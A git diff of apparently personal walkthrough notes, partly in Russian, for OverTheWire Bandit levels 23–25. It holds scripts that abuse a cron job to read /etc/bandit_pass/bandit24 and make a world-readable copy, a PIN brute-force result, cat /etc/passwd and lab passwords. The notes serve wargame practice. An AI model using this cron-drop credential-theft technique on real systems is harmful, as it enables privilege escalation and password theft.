@@ -1,4 +1,4 @@
-https://overthewire.org/wargame
+https://overthewire.org/wargames/bandit/
 #### Stage0
  ssh -v -p 2220 bandit0@bandit.labs.overthewire.org
 ls 
@@ -233,3 +233,91 @@ source /usr/bin/cronjob_bandit23.sh)
 
  #### Stage23
   ssh -v -p 2220 bandit23@bandit.labs.overthewire.org
+
+  #!/bin/bash
+
+myname=$(whoami)
+cat /usr/bin/cronjob_bandit24.sh
+
+cd /var/spool/$myname/foo
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+
+
+Итак. раз в минуту скрипт cron выполняет все скрипты в директории /var/spool/$myname/foo
+от имени bandit24
+задача написать скрипт, который прочитает пароль в /etc/bandit_pass/bandit24 и запишет куданибудь
+1. созадем файл /var/spool/$myname/foo
+даем ему x
+ в файле пишем
+читаем пароль
+создаем файл в диреткории /var/spool/$myname/ ( у bandit23  есть к ней доступ)
+даем параватна чтение всем
+chmod 777 /var/spool/bandit24/new.sh
+
+
+#!/bin/bash
+pwd=$(cat /etc/bandit_pass/bandit24)
+echo $pwd >  /var/spool/bandit24/pdw24.txt
+chmod 666 /var/spool/bandit24/pdw24.txt
+
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /var/spool/bandit24/pdw24.txt
+chmod 666 /var/spool/bandit24/pdw24.txt
+
+#!/bin/bash
+echo start
+cat /etc/bandit_pass/bandit24 > /tmp/tmp.YRbwVha9Wf/pdw24.txt
+chmod 666 /tmp/tmp.YRbwVha9Wf/pdw24.txt
+
+cp  /tmp/tmp.YRbwVha9Wf/new.sh /var/spool/bandit24/foo
+
+
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+
+
+#!/bin/bash
+echo "start"
+# cat /etc/bandit_pass/bandit24 > /tmp/tmp.YRbwVha9Wf/pdw24.txt
+#chmod 666 /tmp/tmp.YRbwVha9Wf/pdw24.txt
+
+whoami > /var/spool/bandit24/foo/whoami.txt
+chmod  666 /var/spool/bandit24/foo/whoami.txt
+
+cat /etc/bandit_pass/bandit24 > /var/spool/bandit24/foo/pwd24.txt
+chmod  666 /var/spool/bandit24/foo/pwd24.txt
+
+
+ #### Stage24
+  ssh -v -p 2220 bandit24@bandit.labs.overthewire.org
+
+connect to the port 30002 and make script to make pincode + password for user bandit24
+
+FOUND: gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 5062
+Correct!
+The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
+
+
+coproc NC { ncat localhost 30002; }
+
+ #### Stage25
+  ssh -v -p 2220 bandit25@bandit.labs.overthewire.org
+#в какой оболочке мы работаем
+echo $SHELL
+
+# show all users and оболочек
+cat /etc/passwd
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+less /usr/bin/showtext
+
